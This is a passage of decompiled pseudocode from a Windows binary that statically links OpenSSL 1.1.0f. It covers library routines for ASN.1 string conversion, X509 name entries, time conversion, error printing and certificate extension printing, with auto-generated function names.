    v23 = 22;
  }
  else if ( (a5 & 4) != 0 )
  {
    v23 = 20;
  }
  else if ( (a5 & 0x800) != 0 )
  {
    v23 = 30;
    v22 = 4098;
  }
  else if ( (a5 & 0x100) != 0 )
  {
    v23 = 28;
    v22 = 4100;
  }
  else
  {
    v23 = 12;
    v22 = 4096;
  }
  if ( !a1 )
    return v23;
  v24 = *a1;
  if ( v24 )
  {
    v25 = 0;
    sub_14001D930(*((void **)v24 + 1));
    *((_QWORD *)v24 + 1) = 0i64;
    *v24 = 0;
    v24[1] = v23;
  }
  else
  {
    v25 = 1;
    v24 = sub_140047720(v23);
    if ( !v24 )
    {
      sub_140024610(13, 122, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\a_mbstr.c", 154);
      return 0xFFFFFFFFi64;
    }
    *v34 = v24;
  }
  if ( v31 == v22 )
  {
    if ( !(unsigned int)sub_1400475D0((__int64)v24, a2, v9) )
    {
      sub_140024610(13, 122, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\a_mbstr.c", 162);
      return 0xFFFFFFFFi64;
    }
  }
  else
  {
    v26 = v22 - 4096;
    if ( v26 )
    {
      v27 = v26 - 1;
      if ( v27 )
      {
        v28 = v27 - 1;
        if ( v28 )
        {
          if ( v28 == 2 )
          {
            v30 = 4 * v16;
            v7 = (__int64 (__fastcall *)(__int64, __int64))sub_1400AB5E0;
          }
        }
        else
        {
          v30 = 2 * v16;
          v7 = (__int64 (__fastcall *)(__int64, __int64))sub_1400AB5C0;
        }
      }
      else
      {
        v30 = v16;
        v7 = (__int64 (__fastcall *)(__int64, __int64))sub_1400AB5B0;
      }
    }
    else
    {
      v30 = 0;
      sub_1400AB680(a2, v9, v31, (__int64 (__fastcall *)(__int64, __int64))sub_1400AB650, (__int64)&v30);
      v7 = (__int64 (__fastcall *)(__int64, __int64))sub_1400AB610;
    }
    v32 = sub_14001D8E0(v30 + 1);
    if ( !v32 )
    {
      if ( v25 )
        sub_140047500((__int64)v24);
      sub_140024610(13, 122, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\a_mbstr.c", 194);
      return 0xFFFFFFFFi64;
    }
    v29 = v31;
    *v24 = v30;
    *((_QWORD *)v24 + 1) = v32;
    v32[v30] = 0;
    sub_1400AB680(a2, v9, v29, v7, (__int64)&v32);
  }
  return v23;
}
// 1400AB5C0: using guessed type __int64 __fastcall sub_1400AB5C0();

//----- (00000001400AB5B0) ----------------------------------------------------
__int64 __fastcall sub_1400AB5B0(char a1, _BYTE **a2)
{
  __int64 result; // rax

  **a2 = a1;
  result = 1i64;
  ++*a2;
  return result;
}

//----- (00000001400AB5E0) ----------------------------------------------------
__int64 __fastcall sub_1400AB5E0(int a1, _BYTE **a2)
{
  _BYTE *v2; // r8
  __int64 result; // rax

  v2 = *a2;
  *v2 = HIBYTE(a1);
  v2[1] = BYTE2(a1);
  v2[2] = BYTE1(a1);
  result = 1i64;
  v2[3] = a1;
  *a2 += 4;
  return result;
}

//----- (00000001400AB610) ----------------------------------------------------
__int64 __fastcall sub_1400AB610(unsigned int a1, _BYTE **a2)
{
  __int64 v3; // rcx
  __int64 result; // rax

  v3 = (int)sub_1400AA3E0(*a2, 255, a1);
  result = 1i64;
  *a2 += v3;
  return result;
}

//----- (00000001400AB650) ----------------------------------------------------
__int64 __fastcall sub_1400AB650(unsigned int a1, _DWORD *a2)
{
  *a2 += sub_1400AA3E0(0i64, -1, a1);
  return 1i64;
}

//----- (00000001400AB680) ----------------------------------------------------
__int64 __fastcall sub_1400AB680(char *a1, int a2, int a3, __int64 (__fastcall *a4)(__int64, __int64), __int64 a5)
{
  int v7; // edi
  __int64 v9; // r14
  __int64 v10; // rcx
  int v11; // eax
  int v12; // eax
  int v13; // eax
  __int64 result; // rax
  unsigned int v15; // [rsp+48h] [rbp+10h] BYREF

  v7 = a2;
  if ( a2 )
  {
    v9 = a5;
    do
    {
      switch ( a3 )
      {
        case 4097:
          v10 = (unsigned __int8)*a1++;
          --v7;
          v15 = v10;
          break;
        case 4098:
          v15 = (unsigned __int8)*a1 << 8;
          v11 = (unsigned __int8)a1[1];
          a1 += 2;
          v10 = v11 | v15;
          v15 |= v11;
          v7 -= 2;
          break;
        case 4100:
          v15 = (unsigned __int8)*a1 << 24;
          v15 |= (unsigned __int8)a1[1] << 16;
          v15 |= (unsigned __int8)a1[2] << 8;
          v12 = (unsigned __int8)a1[3];
          a1 += 4;
          v10 = v12 | v15;
          v15 |= v12;
          v7 -= 4;
          break;
        default:
          v13 = sub_1400AA130(a1, v7, &v15);
          if ( v13 < 0 )
            return 0xFFFFFFFFi64;
          v10 = v15;
          v7 -= v13;
          a1 += v13;
          break;
      }
      if ( a4 )
      {
        result = a4(v10, v9);
        if ( (int)result <= 0 )
          return result;
      }
    }
    while ( v7 );
  }
  return 1i64;
}

//----- (00000001400AB790) ----------------------------------------------------
__int64 __fastcall sub_1400AB790(unsigned int a1, int *a2)
{
  int v2; // ebx

  v2 = *a2;
  if ( (*a2 & 1) != 0 && (a1 > 0x7F || !isdigit(a1) && a1 != 32) )
    v2 &= ~1u;
  if ( (v2 & 2) != 0
    && (a1 > 0x7F || a1 - 97 > 0x19 && a1 - 65 > 0x19 && a1 - 48 > 9 && a1 != 32 && !strchr("'()+,-./:=?", a1)) )
  {
    v2 &= ~2u;
  }
  if ( (v2 & 0x10) != 0 && a1 > 0x7F )
    v2 &= ~0x10u;
  if ( (v2 & 4) != 0 && a1 > 0xFF )
    v2 &= ~4u;
  if ( (v2 & 0x800) != 0 && a1 > 0xFFFF )
    v2 &= ~0x800u;
  if ( !v2 )
    return 0xFFFFFFFFi64;
  *a2 = v2;
  return 1i64;
}

//----- (00000001400AB870) ----------------------------------------------------
unsigned int *__fastcall sub_1400AB870(unsigned int **a1, __int64 a2, int a3, char *a4, int a5)
{
  unsigned int *v9; // rbx

  if ( !a1 || (v9 = *a1) == 0i64 )
  {
    v9 = (unsigned int *)sub_1400A4C40();
    if ( !v9 )
      return 0i64;
  }
  if ( !sub_1400ABAF0((__int64 *)v9, a2) || !sub_1400ABA00((__int64 *)v9, a3, a4, a5) )
  {
    if ( !a1 || v9 != *a1 )
      sub_1400A4C20(v9);
    return 0i64;
  }
  if ( a1 )
  {
    if ( !*a1 )
      *a1 = v9;
  }
  return v9;
}

//----- (00000001400AB930) ----------------------------------------------------
unsigned int *__fastcall sub_1400AB930(unsigned int **a1, char *a2, int a3, char *a4, int a5)
{
  char **v9; // rdi
  unsigned int *v11; // rbx

  v9 = sub_14002C840(a2, 0);
  if ( v9 )
  {
    v11 = sub_1400AB870(a1, (__int64)v9, a3, a4, a5);
    sub_14003F4D0((__int64)v9);
    return v11;
  }
  else
  {
    sub_140024610(11, 131, 119, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509\\x509name.c", 250);
    sub_140023A40(2, "name=", a2);
    return 0i64;
  }
}

//----- (00000001400AB9F0) ----------------------------------------------------
__int64 __fastcall sub_1400AB9F0(__int64 a1)
{
  if ( a1 )
    return *(_QWORD *)(a1 + 8);
  else
    return 0i64;
}

//----- (00000001400ABA00) ----------------------------------------------------
_BOOL8 __fastcall sub_1400ABA00(__int64 *a1, int a2, char *a3, int a4)
{
  int v4; // ebx
  int v8; // eax
  unsigned int v10; // ebx
  char *i; // rax

  v4 = a4;
  if ( !a1 || !a3 && a4 )
    return 0i64;
  if ( a2 > 0 && (a2 & 0x1000) != 0 )
  {
    v8 = sub_14002C260(*a1);
    return sub_1400B6EB0(a1 + 1, a3, v4, a2, v8) != 0;
  }
  if ( a4 < 0 )
  {
    v10 = 0;
    for ( i = a3; *i; ++v10 )
    {
      if ( v10 >= 0x80000000 )
        break;
      ++i;
    }
    v4 = v10 & 0x7FFFFFFF;
  }
  if ( !(unsigned int)sub_1400475D0(a1[1], a3, v4) )
    return 0i64;
  if ( a2 != -1 )
  {
    if ( a2 == -2 )
    {
      *(_DWORD *)(a1[1] + 4) = sub_1400BC8B0((unsigned __int8 *)a3, v4);
      return 1i64;
    }
    *(_DWORD *)(a1[1] + 4) = a2;
  }
  return 1i64;
}

//----- (00000001400ABAF0) ----------------------------------------------------
_BOOL8 __fastcall sub_1400ABAF0(__int64 *a1, __int64 a2)
{
  __int64 v4; // rax

  if ( a1 && a2 )
  {
    sub_14003F4D0(*a1);
    v4 = sub_140047B90(a2);
    *a1 = v4;
    return v4 != 0;
  }
  else
  {
    sub_140024610(11, 115, 67, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509\\x509name.c", 308);
    return 0i64;
  }
}

//----- (00000001400ABB70) ----------------------------------------------------
__int64 __fastcall sub_1400ABB70(__int64 a1, unsigned int *a2, int a3, int a4)
{
  unsigned int *v9; // rsi
  int v10; // eax
  int v11; // ebp
  int v12; // edi
  __int64 v13; // rax
  unsigned int *v14; // r14
  int v15; // ebx
  int i; // edi
  __int64 v17; // rax

  if ( !a1 )
    return 0i64;
  v9 = *(unsigned int **)a1;
  v10 = sub_1400296E0(*(unsigned int **)a1);
  if ( a3 <= v10 )
  {
    if ( a3 < 0 )
      a3 = v10;
  }
  else
  {
    a3 = v10;
  }
  *(_DWORD *)(a1 + 8) = 1;
  if ( a4 == -1 )
  {
    if ( a3 )
    {
      v12 = 0;
      v11 = *(_DWORD *)(sub_140029880((__int64)v9, a3 - 1) + 16);
    }
    else
    {
      v11 = 0;
      v12 = 1;
    }
  }
  else
  {
    v12 = 0;
    if ( a3 < v10 )
    {
      v11 = *(_DWORD *)(sub_140029880((__int64)v9, a3) + 16);
    }
    else if ( a3 )
    {
      v11 = *(_DWORD *)(sub_140029880((__int64)v9, a3 - 1) + 16) + 1;
    }
    else
    {
      v11 = 0;
    }
    LOBYTE(v12) = v11 == 0;
  }
  v13 = sub_1400A4C00(a2);
  v14 = (unsigned int *)v13;
  if ( !v13 )
    goto LABEL_20;
  *(_DWORD *)(v13 + 16) = v11;
  if ( !(unsigned int)sub_140029500((int *)v9, v13, a3) )
  {
    sub_140024610(11, 113, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\x509\\x509name.c", 225);
LABEL_20:
    sub_1400A4C20(v14);
    return 0i64;
  }
  if ( v12 )
  {
    v15 = a3 + 1;
    for ( i = sub_1400296E0(v9); v15 < i; ++*(_DWORD *)(v17 + 16) )
      v17 = sub_140029880((__int64)v9, v15++ - 1);
  }
  return 1i64;
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (00000001400ABCC0) ----------------------------------------------------
unsigned int *__fastcall sub_1400ABCC0(__int64 a1, char *a2, int a3, char *a4, int a5, int a6, int a7)
{
  unsigned int *result; // rax
  unsigned int *v9; // rdi
  unsigned int v10; // ebx

  result = sub_1400AB930(0i64, a2, a3, a4, a5);
  v9 = result;
  if ( result )
  {
    v10 = sub_1400ABB70(a1, result, a6, a7);
    sub_1400A4C20(v9);
    return (unsigned int *)v10;
  }
  return result;
}

//----- (00000001400ABD30) ----------------------------------------------------
__int64 __fastcall sub_1400ABD30(__int64 a1, int a2)
{
  int v2; // ebx
  unsigned int *v4; // rdi
  __int64 v5; // r14
  int v6; // eax
  int v7; // ebp
  int v8; // esi
  __int64 v9; // rax

  v2 = a2;
  if ( !a1 || (int)sub_1400296E0(*(unsigned int **)a1) <= a2 || v2 < 0 )
    return 0i64;
  v4 = *(unsigned int **)a1;
  v5 = sub_140029370(*(int **)a1, v2);
  v6 = sub_1400296E0(v4);
  *(_DWORD *)(a1 + 8) = 1;
  v7 = v6;
  if ( v2 != v6 )
  {
    if ( v2 )
      v8 = *(_DWORD *)(sub_140029880((__int64)v4, v2 - 1) + 16);
    else
      v8 = *(_DWORD *)(v5 + 16) - 1;
    if ( v8 + 1 < *(_DWORD *)(sub_140029880((__int64)v4, v2) + 16) && v2 < v7 )
    {
      do
      {
        v9 = sub_140029880((__int64)v4, v2++);
        --*(_DWORD *)(v9 + 16);
      }
      while ( v2 < v7 );
    }
  }
  return v5;
}

//----- (00000001400ABE10) ----------------------------------------------------
__int64 __fastcall sub_1400ABE10(unsigned int **a1)
{
  if ( a1 )
    return sub_1400296E0(*a1);
  else
    return 0i64;
}

//----- (00000001400ABE40) ----------------------------------------------------
__int64 __fastcall sub_1400ABE40(__int64 *a1, int a2)
{
  if ( a1 && (int)sub_1400296E0((unsigned int *)*a1) > a2 && a2 >= 0 )
    return sub_140029880(*a1, a2);
  else
    return 0i64;
}

//----- (00000001400ABE90) ----------------------------------------------------
__int64 __fastcall sub_1400ABE90(unsigned int **a1, unsigned int a2, int a3)
{
  char **v5; // rax

  v5 = sub_14002C0F0(a2);
  if ( v5 )
    return sub_1400ABEE0(a1, (__int64)v5, a3);
  else
    return 4294967294i64;
}

//----- (00000001400ABEE0) ----------------------------------------------------
__int64 __fastcall sub_1400ABEE0(unsigned int **a1, __int64 a2, int a3)
{
  unsigned int *v6; // rsi
  int v7; // eax
  int v8; // ebx
  int v9; // edi
  int v10; // ebx
  __int64 *v11; // rax

  if ( !a1 )
    return 0xFFFFFFFFi64;
  v6 = *a1;
  v7 = sub_1400296E0(*a1);
  v8 = -1;
  v9 = v7;
  if ( a3 >= 0 )
    v8 = a3;
  v10 = v8 + 1;
  if ( v10 >= v7 )
    return 0xFFFFFFFFi64;
  while ( 1 )
  {
    v11 = (__int64 *)sub_140029880((__int64)v6, v10);
    if ( !sub_140047B60(*v11, a2) )
      break;
    if ( ++v10 >= v9 )
      return 0xFFFFFFFFi64;
  }
  return (unsigned int)v10;
}

//----- (00000001400ABF90) ----------------------------------------------------
__int64 __fastcall sub_1400ABF90(__int64 a1)
{
  return sub_1400ABFB0((struct _exception *)sub_140075C40, a1);
}

//----- (00000001400ABFB0) ----------------------------------------------------
__int64 __fastcall sub_1400ABFB0(struct _exception *a1, __int64 a2)
{
  unsigned int v4; // ebx
  __int64 result; // rax
  char *v6; // rax
  unsigned int v7; // eax
  char *i; // rcx
  __int64 v9; // rdx
  __int64 v10; // [rsp+30h] [rbp-1148h]
  int v11; // [rsp+40h] [rbp-1138h] BYREF
  int v12; // [rsp+44h] [rbp-1134h] BYREF
  char *v13; // [rsp+48h] [rbp-1130h] BYREF
  __int64 v14[2]; // [rsp+50h] [rbp-1128h] BYREF
  char v15[256]; // [rsp+60h] [rbp-1118h] BYREF
  char v16[4096]; // [rsp+160h] [rbp-1018h] BYREF

  v4 = UserMathErrorFunction(a1);
  for ( result = sub_140023EE0(v14, &v12, &v13, &v11); (_DWORD)result; result = sub_140023EE0(v14, &v12, &v13, &v11) )
  {
    sub_140023C40(result, v15, 0x100ui64);
    v6 = byte_1400D7DAE;
    if ( (v11 & 2) != 0 )
      v6 = v13;
    LODWORD(v10) = v12;
    sub_14002A5C0(v16, 0x1000ui64, "%lu:%s:%s:%d:%s\n", v4, v15, v14[0], v10, v6);
    v7 = 0;
    for ( i = v16; *i; ++v7 )
    {
      if ( v7 >= 0x80000000 )
        break;
      ++i;
    }
    v9 = v7;
    LODWORD(v9) = v7 & 0x7FFFFFFF;
    result = ((__int64 (__fastcall *)(char *, __int64, __int64))a1)(v16, v9, a2);
    if ( (int)result <= 0 )
      break;
  }
  return result;
}
// 1400AC06C: variable 'v10' is possibly undefined

//----- (00000001400AC100) ----------------------------------------------------
_DWORD *__fastcall sub_1400AC100(_DWORD *a1, __time64_t a2, int a3, int a4)
{
  struct tm *v7; // rax
  struct tm *v8; // rsi
  __time64_t v10; // [rsp+30h] [rbp-68h] BYREF
  char v11[40]; // [rsp+38h] [rbp-60h] BYREF

  v10 = a2;
  v7 = sub_1400BCA70(&v10, (__int64)v11);
  v8 = v7;
  if ( !v7 )
  {
    sub_140024610(13, 217, 173, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\a_time.c", 40);
    return 0i64;
  }
  if ( (a3 || a4) && !(unsigned int)sub_1400BCAB0(&v7->tm_sec, a3, a4) )
    return 0i64;
  if ( (unsigned int)(v8->tm_year - 50) > 0x63 )
    return sub_1400BD3F0(a1, v10, a3, a4);
  else
    return sub_1400BCDA0(a1, v10, a3, a4);
}
// 1400AC100: using guessed type char var_60[40];

//----- (00000001400AC1C0) ----------------------------------------------------
__int64 __fastcall sub_1400AC1C0(int *a1)
{
  int v1; // eax

  v1 = a1[1];
  if ( v1 == 24 )
    return sub_1400BD590(a1);
  if ( v1 == 23 )
    return sub_1400BCF50(a1);
  return 0i64;
}

//----- (00000001400AC200) ----------------------------------------------------
void __fastcall sub_1400AC200(unsigned int *a1)
{
  sub_140051250(a1, (__int64)&unk_14011C3A0);
}

//----- (00000001400AC220) ----------------------------------------------------
void *sub_1400AC220()
{
  return &unk_14011C3A0;
}

//----- (00000001400AC230) ----------------------------------------------------
__int64 __fastcall sub_1400AC230(__int64 a1, __int64 a2)
{
  int v2; // eax

  v2 = *(_DWORD *)(a2 + 4);
  if ( v2 == 23 )
    return sub_1400BCF70(a1, a2);
  if ( v2 == 24 )
    return sub_1400BD5B0(a1, a2);
  sub_14002A430(a1, (__int64)"Bad time value", 0xEu);
  return 0i64;
}

//----- (00000001400AC280) ----------------------------------------------------
__int64 __fastcall sub_1400AC280(__int64 a1, __int64 a2, int a3, unsigned int a4)
{
  int v4; // eax
  unsigned int v6; // esi
  void *v7; // r13
  __FrameHandler3::TryBlockMap *v11; // rbx
  unsigned int v12; // r12d
  __int64 v13; // rax
  __int64 v14; // rbx
  int v15; // ebp
  __int64 (*v16)(void); // rax
  __int64 v17; // rax
  __int64 v18; // rax
  unsigned int *v19; // rdi
  __int64 (__fastcall *v20)(__int64, unsigned int *); // rax
  __int64 v21; // rax
  __int64 (__fastcall *v22)(__int64, unsigned int *, _QWORD); // rax
  unsigned int (__fastcall *v23)(__int64, unsigned int *, __int64, _QWORD); // rax
  __int64 (*v24)(void); // rax
  __int64 v25; // rax
  struct _xDISPATCHER_CONTEXT *v27; // [rsp+30h] [rbp-38h] BYREF
  unsigned int *v28; // [rsp+38h] [rbp-30h]

  v6 = v4 - 63;
  v7 = 0i64;
  v28 = 0i64;
  v11 = (__FrameHandler3::TryBlockMap *)sub_1400AC9D0(a2);
  v27 = __FrameHandler3::TryBlockMap::getpDC(v11);
  v12 = sub_14001D4F0((unsigned int *)v11);
  v13 = sub_1400BDC30(a2);
  v14 = v13;
  if ( !v13 )
  {
    v15 = a3 & 0xF0000;
    if ( v15 )
    {
      if ( v15 == 0x10000 )
      {
        sub_14002A590(a1, "%*s<Not Supported>", a4, byte_1400D7DAE);
        return v6;
      }
      goto LABEL_4;
    }
    return 0;
  }
  v16 = *(__int64 (**)(void))(v13 + 8);
  if ( v16 )
  {
    v17 = v16();
    v18 = sub_1400516D0(0i64, (char **)&v27, v12, v17);
  }
  else
  {
    v18 = (*(__int64 (__fastcall **)(_QWORD, struct _xDISPATCHER_CONTEXT **, _QWORD))(v14 + 32))(0i64, &v27, v12);
  }
  v19 = (unsigned int *)v18;
  if ( v18 )
  {
    v20 = *(__int64 (__fastcall **)(__int64, unsigned int *))(v14 + 48);
    if ( v20 )
    {
      v21 = v20(v14, v19);
      v7 = (void *)v21;
      if ( v21 )
      {
        sub_14002A590(a1, "%*s%s", a4, byte_1400D7DAE, v21);
        goto LABEL_26;
      }
    }
    else
    {
      v22 = *(__int64 (__fastcall **)(__int64, unsigned int *, _QWORD))(v14 + 64);
      if ( v22 )
      {
        v28 = (unsigned int *)v22(v14, v19, 0i64);
        if ( v28 )
        {
          sub_1400AC4D0(a1, v28, a4, *(_DWORD *)(v14 + 4) & 4);
          goto LABEL_26;
        }
      }
      else
      {
        v23 = *(unsigned int (__fastcall **)(__int64, unsigned int *, __int64, _QWORD))(v14 + 80);
        if ( v23 && v23(v14, v19, a1, a4) )
          goto LABEL_26;
      }
    }
    v6 = 0;
LABEL_26:
    sub_140029720(v28, (void (*)(void))sub_1400B8520);
    sub_14001D930(v7);
    v24 = *(__int64 (**)(void))(v14 + 8);
    if ( v24 )
    {
      v25 = v24();
      sub_140051250(v19, v25);
    }
    else
    {
      (*(void (__fastcall **)(unsigned int *))(v14 + 24))(v19);
    }
    return v6;
  }
  v15 = a3 & 0xF0000;
  if ( !v15 )
    return 0;
  if ( v15 == 0x10000 )
  {
    sub_14002A590(a1, "%*s<Parse Error>", a4, byte_1400D7DAE);
    return v6;
  }
LABEL_4:
  if ( v15 == 0x20000 )
  {
    return (unsigned int)sub_1400AA590(a1, v27, v12, a4, -1);
  }
  else if ( v15 == 196608 )
  {
    return (unsigned int)sub_1400757A0(a1, (__int64)v27, v12, a4);
  }
  return v6;
}
// 1400AC2A8: variable 'v4' is possibly undefined

//----- (00000001400AC4D0) ----------------------------------------------------
void __fastcall sub_1400AC4D0(__int64 a1, unsigned int *a2, unsigned int a3, int a4)
{
  int i; // edi
  __int64 v9; // rax
  const char *v10; // r8
  const char *v11; // r9

  if ( a2 )
  {
    if ( !a4 || !(unsigned int)sub_1400296E0(a2) )
    {
      sub_14002A590(a1, "%*s", a3, byte_1400D7DAE);
      if ( !(unsigned int)sub_1400296E0(a2) )
        sub_14002A1A0(a1, (__int64)"<EMPTY>\n");
    }
    for ( i = 0; i < (int)sub_1400296E0(a2); ++i )
    {
      if ( a4 )
      {
        sub_14002A590(a1, "%*s", a3, byte_1400D7DAE);
      }
      else if ( i > 0 )
      {
        sub_14002A590(a1, ", ");
      }
      v9 = sub_140029880((__int64)a2, i);
      v10 = *(const char **)(v9 + 8);
      if ( v10 )
      {
        v11 = *(const char **)(v9 + 16);
        if ( v11 )
          sub_14002A590(a1, "%s:%s", v10, v11);
        else
          sub_14002A1A0(a1, *(_QWORD *)(v9 + 8));
      }
      else
      {
        sub_14002A1A0(a1, *(_QWORD *)(v9 + 16));
      }
      if ( a4 )
        sub_14002A1A0(a1, (__int64)"\n");
    }
  }
}

//----- (00000001400AC620) ----------------------------------------------------
__int64 __fastcall sub_1400AC620(__int64 a1, __int64 a2, unsigned int *a3, int a4, unsigned int a5)
{
  unsigned int v10; // esi
  int v11; // edi
  __int64 v12; // rbp
  __int64 v13; // rax
  int v14; // eax
  char *v15; // r8
  __int64 v16; // rax

  if ( (int)sub_1400296E0(a3) <= 0 )
    return 1i64;
  v10 = a5;
  if ( a2 )
  {
    sub_14002A590(a1, "%*s%s:\n", a5, byte_1400D7DAE, a2);
    v10 = a5 + 4;
  }
  v11 = 0;
  if ( (int)sub_1400296E0(a3) <= 0 )
    return 1i64;
  while ( 1 )
  {
    v12 = sub_140029880((__int64)a3, v11);
    if ( v10 )
    {
      if ( (int)sub_14002A590(a1, "%*s", v10, byte_1400D7DAE) <= 0 )
        break;
    }
    v13 = sub_1400252A0(v12);
    sub_14003FD20(a1, v13);
    LOBYTE(v14) = sub_1400AC9C0(v12);
    v15 = byte_1400D7DAE;
    if ( v14 )
      v15 = "critical";
    if ( (int)sub_14002A590(a1, ": %s\n", v15) <= 0 )
      break;
    if ( !(unsigned int)sub_1400AC280(a1, v12, a4, v10 + 4) )
    {
      sub_14002A590(a1, "%*s", v10 + 4, byte_1400D7DAE);
      v16 = sub_1400AC9D0(v12);
      sub_1400BC980(a1, v16);
    }
    if ( (int)sub_14002A430(a1, (__int64)"\n", 1u) <= 0 )
      break;
    if ( ++v11 >= (int)sub_1400296E0(a3) )
      return 1i64;
  }
  return 0i64;
}
// 1400AC716: variable 'v14' is possibly undefined

//----- (00000001400AC7C0) ----------------------------------------------------
__int64 __fastcall sub_1400AC7C0(__int64 a1, int *a2, __int64 a3, _DWORD *a4)
{
  void *v9; // rax

  if ( a2 == sub_14005BAC0() && (*(_DWORD *)(a1 + 124) & 0x100) != 0 )
  {
    if ( a4 )
      *a4 = 20;
    *(_OWORD *)a3 = *(_OWORD *)(a1 + 176);
    *(_DWORD *)(a3 + 16) = *(_DWORD *)(a1 + 192);
    return 1i64;
  }
  else
  {
    v9 = sub_1400B3B60();
    return sub_1400BDE90((__int64)v9, a2, (unsigned int *)a1, a3, a4);
  }
}

//----- (00000001400AC860) ----------------------------------------------------
__int64 __fastcall sub_1400AC860(__int64 a1, int *a2, __int64 a3, _DWORD *a4)
{
  void *v9; // rax

  if ( a2 == sub_14005BAC0() && (*(_DWORD *)(a1 + 192) & 0x100) != 0 )
  {
    if ( a4 )
      *a4 = 20;
    *(_OWORD *)a3 = *(_OWORD *)(a1 + 272);
    *(_DWORD *)(a3 + 16) = *(_DWORD *)(a1 + 288);
    return 1i64;
  }
  else
  {
    v9 = sub_14005EEC0();
    return sub_1400BDE90((__int64)v9, a2, (unsigned int *)a1, a3, a4);
  }
}

//----- (00000001400AC900) ----------------------------------------------------
__int64 __fastcall sub_1400AC900(__int64 a1, int a2, _DWORD *a3, int *a4)
{
  return sub_1400BDD00(*(unsigned int **)(a1 + 56), a2, a3, a4);
}

//----- (00000001400AC920) ----------------------------------------------------
__int64 __fastcall sub_1400AC920(__int64 a1, int a2, _DWORD *a3, int *a4)
{
  return sub_1400BDD00(*(unsigned int **)(a1 + 32), a2, a3, a4);
}

//----- (00000001400AC940) ----------------------------------------------------
__int64 __fastcall sub_1400AC940(__int64 a1, int a2)
{
  return sub_1400AC9E0(*(unsigned int **)(a1 + 104), a2);
}

//----- (00000001400AC960) ----------------------------------------------------
__int64 __fastcall sub_1400AC960(__int64 a1, unsigned int a2, int a3)
{
  return sub_1400ACA30(*(unsigned int **)(a1 + 104), a2, a3);
}

//----- (00000001400AC980) ----------------------------------------------------
__int64 __fastcall sub_1400AC980(__int64 a1)
{
  return sub_1400ACB10(*(unsigned int **)(a1 + 104));
}

//----- (00000001400AC9A0) ----------------------------------------------------
__int64 __fastcall sub_1400AC9A0(__int64 a1, int a2, _DWORD *a3, int *a4)
{
  return sub_1400BDD00(*(unsigned int **)(a1 + 104), a2, a3, a4);
}

//----- (00000001400AC9C0) ----------------------------------------------------
bool __fastcall sub_1400AC9C0(__int64 a1)
{
  bool result; // al

  result = 0;
  if ( a1 )
    return *(_DWORD *)(a1 + 8) > 0;
  return result;
}

//----- (00000001400AC9D0) ----------------------------------------------------
__int64 __fastcall sub_1400AC9D0(__int64 a1)
{
  if ( a1 )
    return a1 + 16;
  else
    return 0i64;
}

//----- (00000001400AC9E0) ----------------------------------------------------
__int64 __fastcall sub_1400AC9E0(unsigned int *a1, int a2)
{
  if ( a1 && (int)sub_1400296E0(a1) > a2 && a2 >= 0 )
    return sub_140029880((__int64)a1, a2);
  else
    return 0i64;
}

//----- (00000001400ACA30) ----------------------------------------------------
__int64 __fastcall sub_1400ACA30(unsigned int *a1, unsigned int a2, int a3)
{
  char **v5; // rax

  v5 = sub_14002C0F0(a2);
  if ( v5 )
    return sub_1400ACA80(a1, (__int64)v5, a3);
  else
    return 4294967294i64;
}

//----- (00000001400ACA80) ----------------------------------------------------
__int64 __fastcall sub_1400ACA80(unsigned int *a1, __int64 a2, int a3)
{
  int v6; // ebx
  int v7; // edi
  __int64 *v8; // rax

  if ( !a1 )
    return 0xFFFFFFFFi64;
  v6 = 0;
  if ( a3 + 1 >= 0 )
    v6 = a3 + 1;
  v7 = sub_1400296E0(a1);
  if ( v6 >= v7 )
    return 0xFFFFFFFFi64;
  while ( 1 )
  {
    v8 = (__int64 *)sub_140029880((__int64)a1, v6);
    if ( !sub_140047B60(*v8, a2) )
      break;
    if ( ++v6 >= v7 )
      return 0xFFFFFFFFi64;
  }
  return (unsigned int)v6;
}

//----- (00000001400ACB10) ----------------------------------------------------
__int64 __fastcall sub_1400ACB10(unsigned int *a1)
{
  if ( a1 )
    return sub_1400296E0(a1);
  else
    return 0i64;
}

//----- (00000001400ACB40) ----------------------------------------------------
void *sub_1400ACB40()
{
  return &unk_14011C4E0;
}

//----- (00000001400ACB50) ----------------------------------------------------
void __fastcall sub_1400ACB50(unsigned int *a1)
{
  sub_140051250(a1, (__int64)&unk_14011C550);
}

//----- (00000001400ACB70) ----------------------------------------------------
void *sub_1400ACB70()
{
  return &unk_14011C550;
}

//----- (00000001400ACB80) ----------------------------------------------------
__int64 sub_1400ACB80()
{
  return sub_140050B70((__int64)&unk_14011C550);
}

//----- (00000001400ACBA0) ----------------------------------------------------
void *sub_1400ACBA0()
{
  return &unk_14011C6A0;
}

//----- (00000001400ACBB0) ----------------------------------------------------
int *__fastcall sub_1400ACBB0(__int64 a1, __int64 a2, int *a3)
{
  int *v5; // [rsp+40h] [rbp+18h] BYREF

  v5 = a3;
  sub_1400B8440(&byte_14011C6F4, *(_DWORD *)a2, &v5);
  sub_1400B8470("pathlen", *(_QWORD *)(a2 + 8), &v5);
  return v5;
}
// 14011C6F4: using guessed type char byte_14011C6F4;

//----- (00000001400ACC00) ----------------------------------------------------
__int64 __fastcall sub_1400ACC00(__int64 a1, __int64 a2, unsigned int *a3)
{
  __int64 v4; // rsi
  int v6; // ebx
  _QWORD *v7; // rax
  _QWORD *v8; // rdi
  _BYTE *v9; // rdx
  int v10; // eax
  __int64 v11; // rax
  char v12; // cl

  v4 = sub_140050B70((__int64)&unk_14011C6A0);
  if ( v4 )
  {
    v6 = 0;
    if ( (int)sub_1400296E0(a3) <= 0 )
    {
      return v4;
    }
    else
    {
      while ( 1 )
      {
        v7 = (_QWORD *)sub_140029880((__int64)a3, v6);
        v8 = v7;
        v9 = (_BYTE *)v7[1];
        if ( *v9 != 67 || v9[1] != 65 || v9[2] )
          break;
        v10 = sub_1400B8590(v7, (_DWORD *)v4);
LABEL_12:
        if ( !v10 )
          goto LABEL_16;
        if ( ++v6 >= (int)sub_1400296E0(a3) )
          return v4;
      }
      v11 = 0i64;
      while ( 1 )
      {
        v12 = v9[v11++];
        if ( v12 != aPathlen[v11 - 1] )
          break;
        if ( v11 == 8 )
        {
          v10 = sub_1400B8800((__int64)v8, (_QWORD *)(v4 + 8));
